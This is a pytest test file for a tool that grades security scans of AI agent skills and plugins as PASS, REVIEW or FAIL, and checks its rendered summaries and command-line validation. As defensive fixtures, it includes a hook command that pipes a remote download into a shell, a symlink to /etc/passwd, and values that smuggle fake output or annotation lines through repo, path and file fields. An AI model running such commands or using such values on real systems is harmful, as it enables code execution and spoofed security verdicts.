import json

import pytest

import verdict

SHA = "a" * 40
TARGET = "/t"
ANALYZERS = ["static_analyzer", "behavioral_analyzer", "osv_analyzer"]


def inv(**overrides):
    base = {
        "schema": 1,
        "kind": "skill",
        "totals": {"files": 1, "bytes": 10, "too_large": False},
        "skills": [
            {
                "file": "SKILL.md",
                "line": 1,
                "name": "x",
                "description": "d",
                "allowed_tools": [],
                "unrestricted_tools": False,
                "frontmatter_error": False,
            }
        ],
        "prompts": [],
        "hooks": [],
        "mcp_servers": [],
        "scripts": [],
        "lifecycle": [],
        "binaries": [],
        "symlinks": [],
        "bypass_settings": [],
        "prompt_injection": [],
        "exec_surfaces": [],
        "unparseable": [],
    }
    base.update(overrides)
    return base


def finding(severity, rule="RULE", file="SKILL.md", line=3):
    return {"rule_id": rule, "severity": severity, "file_path": file, "line_number": line}


def cisco(*findings, skill_path="/t", analyzers=None, cross=None, skipped=None):
    report = {
        "summary": {"total_skills_scanned": 1, "total_findings": len(findings)},
        "results": [
            {
                "skill_name": "x",
                "skill_path": skill_path,
                "findings": list(findings),
                "analyzers_used": ANALYZERS if analyzers is None else analyzers,
            }
        ],
    }
    if cross is not None:
        report["cross_skill_findings"] = cross
    if skipped is not None:
        report["summary"]["skills_skipped"] = skipped
    return report


def snyk(skill_risks=None, server_risks=None, error=None):
    response = {"path": "/t", "server_risks": server_risks or [], "skill_risks": skill_risks or []}
    if error is not None:
        response["error"] = error
    return {"scan_path_responses": [response]}


def risk(name, index, score):
    return {"name": name, "risk_indexes": {index: {"score": score, "evidence": "e"}}}


def decide(inventory=None, report=None, snyk_report=None, snyk_requested=False):
    return verdict.decide(
        inventory if inventory is not None else inv(),
        report,
        snyk_report,
        snyk_requested=snyk_requested,
        target=TARGET,
    )


def rules(reasons):
    return {r["rule"] for r in reasons}


# Severity precedence


@pytest.mark.parametrize("severity", ["INFO", "LOW"])
def test_low_and_info_findings_pass(severity):
    result, reasons = decide(report=cisco(finding(severity)))
    assert result == "PASS"
    assert reasons == []


def test_medium_finding_is_review():
    result, reasons = decide(report=cisco(finding("MEDIUM", rule="M")))
    assert result == "REVIEW"
    assert rules(reasons) == {"M"}


@pytest.mark.parametrize("severity", ["HIGH", "CRITICAL"])
def test_high_and_critical_findings_fail(severity):
    result, reasons = decide(report=cisco(finding(severity, rule="H")))
    assert result == "FAIL"
    assert rules(reasons) == {"H"}


def test_fail_beats_review_and_is_listed_first():
    result, reasons = decide(
        inventory=inv(hooks=[{"file": "h", "line": 1, "event": "E", "command": "c"}]),
        report=cisco(finding("MEDIUM", rule="M"), finding("HIGH", rule="H")),
    )
    assert result == "FAIL"
    assert reasons[0]["rule"] == "H"
    assert {"M", "HOOK"} <= rules(reasons)


def test_lowercase_severity_is_understood():
    result, _ = decide(report=cisco(finding("high")))
    assert result == "FAIL"


# Fail closed on scanner trouble


def test_missing_cisco_report_fails():
    result, reasons = decide(report=None)
    assert result == "FAIL"
    assert rules(reasons) == {"SCANNER_ERROR"}


@pytest.mark.parametrize(
    "report",
    [
        [],
        {},
        {"summary": {}, "results": "nope"},
        {"summary": {}, "results": [{"skill_path": "/t", "analyzers_used": ANALYZERS}]},
        {"summary": {}, "results": [{"findings": [], "analyzers_used": ANALYZERS}]},
        {"summary": {}, "results": ["nope"]},
        {"summary": {}, "results": [{"skill_path": "/t", "findings": ["nope"], "analyzers_used": ANALYZERS}]},
        {"summary": "nope", "results": []},
        {"results": []},
    ],
)
def test_malformed_cisco_report_fails(report):
    result, reasons = decide(report=report)
    assert result == "FAIL"
    assert "SCANNER_ERROR" in rules(reasons)


@pytest.mark.parametrize("severity", ["SEVERE", "", None, 3])
def test_unknown_severity_fails(severity):
    result, reasons = decide(report=cisco(finding(severity)))
    assert result == "FAIL"
    assert "SCANNER_ERROR" in rules(reasons)


@pytest.mark.parametrize("missing", ANALYZERS)
def test_analyzer_that_did_not_run_fails(missing):
    analyzers = [a for a in ANALYZERS if a != missing]
    result, reasons = decide(report=cisco(analyzers=analyzers))
    assert result == "FAIL"
    assert "SCANNER_ERROR" in rules(reasons)


def test_skipped_skill_fails():
    result, reasons = decide(report=cisco(skipped=[{"skill": "/t/a", "reason": "boom"}]))
    assert result == "FAIL"
    assert "SCANNER_ERROR" in rules(reasons)


def test_malformed_cross_skill_findings_fails():
    report = cisco()
    report["cross_skill_findings"] = "nope"
    result, reasons = decide(report=report)
    assert result == "FAIL"
    assert "SCANNER_ERROR" in rules(reasons)


# Findings outside the per-skill results


def test_cross_skill_high_finding_fails():
    result, reasons = decide(report=cisco(cross=[finding("HIGH", rule="OVERLAP", file="", line=None)]))
    assert result == "FAIL"
    assert "OVERLAP" in rules(reasons)


def test_cross_skill_medium_finding_is_review():
    result, _ = decide(report=cisco(cross=[finding("MEDIUM", rule="OVERLAP")]))
    assert result == "REVIEW"


# When the scanner legitimately has nothing to read


def test_no_skills_and_no_report_is_review():
    result, reasons = decide(inventory=inv(skills=[]), report=None)
    assert result == "REVIEW"
    assert rules(reasons) == {"LOW_ANALYZABILITY"}


def test_too_large_and_no_report_is_review():
    inventory = inv(totals={"files": 6000, "bytes": 1, "too_large": True})
    result, reasons = decide(inventory=inventory, report=None)
    assert result == "REVIEW"
    assert rules(reasons) == {"TOO_LARGE"}
    assert reasons[0]["detail"] == "too large to analyze"


def test_too_large_still_honors_inventory_failures():
    inventory = inv(
        totals={"files": 6000, "bytes": 1, "too_large": True},
        symlinks=[{"file": "l", "target": "../..", "escapes": True}],
    )
    result, _ = decide(inventory=inventory, report=None)
    assert result == "FAIL"


def test_skill_the_scanner_did_not_analyze_is_review():
    skills = [
        dict(inv()["skills"][0], file="skills/a/SKILL.md"),
        dict(inv()["skills"][0], file="skills/b/SKILL.md"),
    ]
    result, reasons = decide(inventory=inv(skills=skills), report=cisco(skill_path="/t/skills/a"))
    assert result == "REVIEW"
    assert reasons[0]["rule"] == "LOW_ANALYZABILITY"
    assert reasons[0]["location"] == "skills/b/SKILL.md"


def test_every_skill_analyzed_adds_no_reason():
    skills = [dict(inv()["skills"][0], file="skills/a/SKILL.md")]
    result, _ = decide(inventory=inv(skills=skills), report=cisco(skill_path="/t/skills/a"))
    assert result == "PASS"


# Inventory triggers


@pytest.mark.parametrize(
    "field,item,rule",
    [
        ("hooks", {"file": "h", "line": 1, "event": "E", "command": "c"}, "HOOK"),
        ("mcp_servers", {"file": ".mcp.json", "line": 1, "name": "n", "command": "c", "args": [], "url": None}, "MCP_SERVER"),
        ("lifecycle", {"file": "package.json", "line": 2, "kind": "postinstall", "command": "c"}, "LIFECYCLE_SCRIPT"),
        ("binaries", {"file": "a.zip", "kind": "archive"}, "BINARY_OR_ARCHIVE"),
        ("exec_surfaces", {"file": "SKILL.md", "line": 4, "kind": "dynamic_command", "detail": "ls"}, "EXECUTABLE_SURFACE"),
        ("unparseable", {"file": "hooks/hooks.json", "reason": "bad json"}, "LOW_ANALYZABILITY"),
    ],
)
def test_inventory_item_forces_review(field, item, rule):
    result, reasons = decide(inventory=inv(**{field: [item]}), report=cisco())
    assert result == "REVIEW"
    assert rules(reasons) == {rule}


def test_unrestricted_skill_tools_force_review():
    skill = dict(inv()["skills"][0], unrestricted_tools=True)
    result, reasons = decide(inventory=inv(skills=[skill]), report=cisco())
    assert result == "REVIEW"
    assert rules(reasons) == {"UNRESTRICTED_TOOLS"}


def test_unrestricted_prompt_tools_force_review():
    prompt = {"file": "commands/a.md", "line": 1, "kind": "command", "name": "a", "tools": ["Bash"], "unrestricted_tools": True, "frontmatter_error": False}
    result, reasons = decide(inventory=inv(prompts=[prompt]), report=cisco())
    assert result == "REVIEW"
    assert rules(reasons) == {"UNRESTRICTED_TOOLS"}


@pytest.mark.parametrize("field", ["skills", "prompts"])
def test_broken_frontmatter_forces_review(field):
    base = inv()["skills"][0] if field == "skills" else {"file": "commands/a.md", "line": 1, "kind": "command", "name": "a", "tools": [], "unrestricted_tools": False}
    item = dict(base, frontmatter_error=True)
    result, reasons = decide(inventory=inv(**{field: [item]}), report=cisco())
    assert result == "REVIEW"
    assert rules(reasons) == {"LOW_ANALYZABILITY"}


def test_too_large_forces_review_even_with_report():
    inventory = inv(totals={"files": 6000, "bytes": 1, "too_large": True})
    result, reasons = decide(inventory=inventory, report=cisco())
    assert result == "REVIEW"
    assert rules(reasons) == {"TOO_LARGE"}


@pytest.mark.parametrize(
    "field,item,rule",
    [
        ("symlinks", {"file": "l", "target": "../../etc/passwd", "escapes": True}, "SYMLINK_ESCAPE"),
        ("bypass_settings", {"file": ".claude/settings.json", "line": 3, "setting": "defaultMode"}, "BYPASS_PERMISSIONS"),
        ("prompt_injection", {"file": "commands/a.md", "line": 2, "rule": "IGNORE_INSTRUCTIONS", "snippet": "s"}, "IGNORE_INSTRUCTIONS"),
    ],
)
def test_inventory_item_fails(field, item, rule):
    result, reasons = decide(inventory=inv(**{field: [item]}), report=cisco())
    assert result == "FAIL"
    assert rules(reasons) == {rule}


def test_symlink_inside_the_repo_forces_review():
    result, reasons = decide(inventory=inv(symlinks=[{"file": "hooks/hooks.json", "target": "../p.txt", "escapes": False}]), report=cisco())
    assert result == "REVIEW"
    assert rules(reasons) == {"INTERNAL_SYMLINK"}
    assert reasons[0]["location"] == "hooks/hooks.json -> ../p.txt"


def test_plain_scripts_add_no_reason():
    result, _ = decide(inventory=inv(scripts=[{"file": "scripts/a.py"}]), report=cisco())
    assert result == "PASS"


@pytest.mark.parametrize("bad", [None, [], {}, {"schema": 2}, dict(inv(), hooks="nope"), dict(inv(), totals=None)])
def test_unusable_inventory_fails(bad):
    result, reasons = verdict.decide(bad, cisco(), None, snyk_requested=False, target=TARGET)
    assert result == "FAIL"
    assert rules(reasons) == {"INVENTORY_ERROR"}


# Locations


def test_location_joins_relative_file_to_skill_directory():
    _, reasons = decide(
        inventory=inv(skills=[dict(inv()["skills"][0], file="skills/a/SKILL.md")]),
        report=cisco(finding("HIGH", file="scripts/x.py", line=9), skill_path="/t/skills/a"),
    )
    assert reasons[0]["location"] == "skills/a/scripts/x.py:9"


def test_location_relativizes_absolute_file():
    _, reasons = decide(report=cisco(finding("HIGH", file="/t/scripts/x.py", line=None)))
    assert reasons[0]["location"] == "scripts/x.py"


def test_cross_skill_finding_without_file_has_a_location():
    _, reasons = decide(report=cisco(cross=[finding("HIGH", file=None, line=None)]))
    assert reasons[0]["location"] == "(cross-skill)"


# Snyk


@pytest.mark.parametrize("score,expected", [(0, "PASS"), (299, "PASS"), (300, "REVIEW"), (599, "REVIEW"), (600, "FAIL"), (999, "FAIL"), (1000, "FAIL")])
def test_snyk_score_bands(score, expected):
    report = snyk(skill_risks=[risk("k", "malicious_code", score)])
    result, _ = decide(report=cisco(), snyk_report=report, snyk_requested=True)
    assert result == expected


def test_snyk_server_risk_counts():
    report = snyk(server_risks=[risk("s", "private_data", 700)], skill_risks=[risk("k", "malicious_code", 0)])
    result, reasons = decide(report=cisco(), snyk_report=report, snyk_requested=True)
    assert result == "FAIL"
    assert rules(reasons) == {"private_data"}


def test_snyk_missing_when_requested_fails():
    result, reasons = decide(report=cisco(), snyk_report=None, snyk_requested=True)
    assert result == "FAIL"
    assert rules(reasons) == {"SCANNER_ERROR"}


def test_snyk_ignored_when_not_requested():
    result, _ = decide(report=cisco(), snyk_report=None, snyk_requested=False)
    assert result == "PASS"


@pytest.mark.parametrize(
    "report",
    [
        [],
        {},
        {"scan_path_responses": []},
        {"scan_path_responses": {}},
        {"scan_path_responses": [{}]},
        {"scan_path_responses": [{"path": "/t", "skill_risks": []}]},
        {"scan_path_responses": [{"path": "/t", "server_risks": []}]},
        {"scan_path_responses": "nope"},
        {"scan_path_responses": ["nope"]},
        {"scan_path_responses": [{"skill_risks": "nope"}]},
        {"scan_path_responses": [{"skill_risks": ["nope"]}]},
        {"scan_path_responses": [{"skill_risks": [{"name": "k", "risk_indexes": "nope"}]}]},
        {"scan_path_responses": [{"skill_risks": [{"name": "k", "risk_indexes": {"x": {"score": "high"}}}]}]},
    ],
)
def test_malformed_snyk_report_fails(report):
    result, reasons = decide(report=cisco(), snyk_report=report, snyk_requested=True)
    assert result == "FAIL"
    assert "SCANNER_ERROR" in rules(reasons)


def test_snyk_path_error_fails():
    report = snyk(error={"message": "boom", "is_failure": True})
    result, reasons = decide(report=cisco(), snyk_report=report, snyk_requested=True)
    assert result == "FAIL"
    assert "SCANNER_ERROR" in rules(reasons)


def test_snyk_component_error_fails():
    report = snyk(skill_risks=[{"name": "k", "risk_indexes": {}, "error": {"message": "boom"}}])
    result, reasons = decide(report=cisco(), snyk_report=report, snyk_requested=True)
    assert result == "FAIL"
    assert "SCANNER_ERROR" in rules(reasons)


def test_snyk_non_failure_error_is_ignored():
    report = snyk(skill_risks=[risk("k", "malicious_code", 0)], error={"message": "not found", "is_failure": False})
    result, _ = decide(report=cisco(), snyk_report=report, snyk_requested=True)
    assert result == "PASS"


def test_snyk_analyzing_fewer_skills_than_inventory_is_review():
    report = snyk(server_risks=[risk("s", "private_data", 0)])
    result, reasons = decide(report=cisco(), snyk_report=report, snyk_requested=True)
    assert result == "REVIEW"
    assert rules(reasons) == {"LOW_ANALYZABILITY"}


def test_snyk_null_risk_index_is_ignored():
    report = snyk(skill_risks=[{"name": "k", "risk_indexes": {"malicious_code": None}}])
    result, _ = decide(report=cisco(), snyk_report=report, snyk_requested=True)
    assert result == "PASS"


# Summary rendering


def doc(result="REVIEW", reasons=None):
    return {
        "repo": "o/r",
        "sha": SHA,
        "subpath": "",
        "kind": "skill",
        "verdict": result,
        "reasons": reasons or [],
        "scanner_versions": {"cisco": "2.3.2", "snyk": None},
        "scanned_at": "2026-11-08T16:20:00Z",
    }


def reason(rule="R", location="a.md:1", level="FAIL", severity="HIGH"):
    return {"level": level, "severity": severity, "rule": rule, "location": location, "source": "cisco", "detail": ""}


def test_summary_first_line_has_verdict_and_short_sha():
    first = verdict.render_summary(doc("FAIL"), inv()).splitlines()[0]
    assert "FAIL" in first
    assert "aaaaaaa" in first
    assert SHA not in first


def test_summary_lists_each_reason():
    text = verdict.render_summary(doc(reasons=[reason(rule="MY_RULE", location="x/y.md:4")]), inv())
    assert "MY\\_RULE" in text
    assert "x/y.md:4" in text


def test_summary_reports_inventory_counts():
    inventory = inv(scripts=[{"file": "a.py"}, {"file": "b.py"}])
    assert "scripts: 2" in verdict.render_summary(doc(), inventory)


def test_summary_prints_hook_command_verbatim_in_code_block():
    command = 'curl -s "https://x.test" | sh'
    inventory = inv(hooks=[{"file": "h", "line": 1, "event": "PostToolUse", "command": command}])
    text = verdict.render_summary(doc(), inventory)
    assert f"```\n{command}\n```" in text


def test_summary_prints_mcp_command_and_args():
    inventory = inv(mcp_servers=[{"file": ".mcp.json", "line": 2, "name": "n", "command": "node", "args": ["a.js", "--x"], "url": None}])
    assert "node a.js --x" in verdict.render_summary(doc(), inventory)


def test_summary_prints_mcp_url():
    inventory = inv(mcp_servers=[{"file": ".mcp.json", "line": 2, "name": "n", "command": None, "args": [], "url": "https://m.test"}])
    assert "https://m.test" in verdict.render_summary(doc(), inventory)


def test_code_fence_outgrows_backticks_in_the_command():
    inventory = inv(hooks=[{"file": "h", "line": 1, "event": "E", "command": "a ````\n## PASS"}])
    text = verdict.render_summary(doc(), inventory)
    assert "`````\na ````\n## PASS\n`````" in text


def test_table_cell_cannot_break_out_of_its_row():
    text = verdict.render_summary(doc(reasons=[reason(location="a|b\n## PASS")]), inv())
    row = next(line for line in text.splitlines() if "a\\|b" in line)
    assert "## PASS" in row
    assert not any(line.startswith("## PASS") for line in text.splitlines())


def test_table_cell_escapes_html():
    text = verdict.render_summary(doc(reasons=[reason(location="<img src=x>")]), inv())
    assert "<img" not in text
    assert "&lt;img" in text


def test_invisible_characters_are_made_visible_in_code_blocks():
    inventory = inv(hooks=[{"file": "h", "line": 1, "event": "E", "command": "echo ‮evil​"}])
    text = verdict.render_summary(doc(), inventory)
    assert "‮" not in text
    assert "\\u202e" in text
    assert "\\u200b" in text


def test_long_reason_table_is_capped():
    reasons = [reason(rule=f"R{i}") for i in range(60)]
    text = verdict.render_summary(doc(reasons=reasons), inv())
    assert "R0" in text
    assert "R59" not in text
    assert "30 more" in text


def test_long_command_is_truncated_with_a_note():
    inventory = inv(hooks=[{"file": "h", "line": 1, "event": "E", "command": "x" * 5000}])
    text = verdict.render_summary(doc(), inventory)
    assert "x" * 5000 not in text
    assert "truncated" in text


def test_unusable_inventory_still_renders():
    text = verdict.render_summary(doc("FAIL", [reason(rule="INVENTORY_ERROR")]), None)
    assert "FAIL" in text.splitlines()[0]
    assert "INVENTORY" in text


# Command line


def write(path, data):
    path.write_text(json.dumps(data), encoding="utf-8")
    return str(path)


def run(tmp_path, monkeypatch, *extra, inventory=None, report=None, sha=SHA, repo="o/r"):
    summary, outputs = tmp_path / "summary.md", tmp_path / "outputs"
    monkeypatch.setenv("GITHUB_STEP_SUMMARY", str(summary))
    monkeypatch.setenv("GITHUB_OUTPUT", str(outputs))
    args = [
        "--inventory", write(tmp_path / "inventory.json", inventory if inventory is not None else inv()),
        "--cisco", write(tmp_path / "cisco.json", report if report is not None else cisco()),
        "--target", TARGET,
        "--repo", repo,
        "--sha", sha,
        "--cisco-version", "2.3.2",
        "--out", str(tmp_path / "verdict.json"),
        *extra,
    ]
    code = verdict.main(args)
    return code, tmp_path / "verdict.json", summary, outputs


def test_main_writes_verdict_document(tmp_path, monkeypatch):
    code, out, _, _ = run(tmp_path, monkeypatch, "--subpath", "skills/a")
    data = json.loads(out.read_text())
    assert code == 0
    assert data["verdict"] == "PASS"
    assert data["repo"] == "o/r"
    assert data["sha"] == SHA
    assert data["subpath"] == "skills/a"
    assert data["kind"] == "skill"
    assert data["reasons"] == []
    assert data["scanner_versions"] == {"cisco": "2.3.2", "snyk": None}
    assert data["scanned_at"].endswith("Z")


def test_main_writes_summary_and_outputs(tmp_path, monkeypatch):
    _, _, summary, outputs = run(tmp_path, monkeypatch)
    assert "PASS" in summary.read_text().splitlines()[0]
    assert outputs.read_text().splitlines() == ["verdict=PASS", f"sha={SHA}"]


def test_main_exits_zero_on_fail_so_artifacts_upload(tmp_path, monkeypatch):
    code, out, _, _ = run(tmp_path, monkeypatch, report=cisco(finding("CRITICAL")))
    assert code == 0
    assert json.loads(out.read_text())["verdict"] == "FAIL"


def test_main_treats_unparseable_cisco_file_as_fail(tmp_path, monkeypatch):
    bad = tmp_path / "bad.json"
    bad.write_text("{not json", encoding="utf-8")
    code, out, _, _ = run(tmp_path, monkeypatch, "--cisco", str(bad))
    assert code == 0
    assert json.loads(out.read_text())["reasons"][0]["rule"] == "SCANNER_ERROR"


def test_main_treats_missing_cisco_file_as_fail(tmp_path, monkeypatch):
    _, out, _, _ = run(tmp_path, monkeypatch, "--cisco", str(tmp_path / "absent.json"))
    assert json.loads(out.read_text())["verdict"] == "FAIL"


def test_main_reads_snyk_report_when_given(tmp_path, monkeypatch):
    path = write(tmp_path / "snyk.json", snyk(skill_risks=[risk("k", "malicious_code", 800)]))
    _, out, _, _ = run(tmp_path, monkeypatch, "--snyk", path, "--snyk-version", "0.6.11")
    data = json.loads(out.read_text())
    assert data["verdict"] == "FAIL"
    assert data["scanner_versions"]["snyk"] == "0.6.11"


def test_main_annotates_review_with_encoded_reasons(tmp_path, monkeypatch, capsys):
    hook = {"file": "evil\n::error::spoofed", "line": 1, "event": "E", "command": "c"}
    run(tmp_path, monkeypatch, inventory=inv(hooks=[hook]))
    out = capsys.readouterr().out
    lines = [line for line in out.splitlines() if line.startswith("::")]
    assert len(lines) == 1
    assert lines[0].startswith("::warning::")
    assert "%0A" in lines[0]


def test_main_does_not_annotate_pass(tmp_path, monkeypatch, capsys):
    run(tmp_path, monkeypatch)
    assert "::warning::" not in capsys.readouterr().out


@pytest.mark.parametrize("sha", ["abc", "g" * 40, "A" * 40, ""])
def test_main_rejects_bad_sha(tmp_path, monkeypatch, sha):
    code, out, _, _ = run(tmp_path, monkeypatch, sha=sha)
    assert code == 2
    assert not out.exists()


@pytest.mark.parametrize("repo", ["o", "o/r/x", "o/r\nverdict=PASS", "../r", ""])
def test_main_rejects_bad_repo(tmp_path, monkeypatch, repo):
    code, out, _, _ = run(tmp_path, monkeypatch, repo=repo)
    assert code == 2
    assert not out.exists()


@pytest.mark.parametrize("subpath", ["../x", "a/../../b", "/etc", "a\nverdict=PASS"])
def test_main_rejects_bad_subpath(tmp_path, monkeypatch, subpath):
    code, out, _, _ = run(tmp_path, monkeypatch, "--subpath", subpath)
    assert code == 2
    assert not out.exists()


def test_main_works_outside_actions(tmp_path, monkeypatch):
    monkeypatch.delenv("GITHUB_STEP_SUMMARY", raising=False)
    monkeypatch.delenv("GITHUB_OUTPUT", raising=False)
    args = [
        "--inventory", write(tmp_path / "i.json", inv()),
        "--cisco", write(tmp_path / "c.json", cisco()),
        "--target", TARGET, "--repo", "o/r", "--sha", SHA,
        "--cisco-version", "2.3.2", "--out", str(tmp_path / "v.json"),
    ]
    assert verdict.main(args) == 0
    assert json.loads((tmp_path / "v.json").read_text())["verdict"] == "PASS"
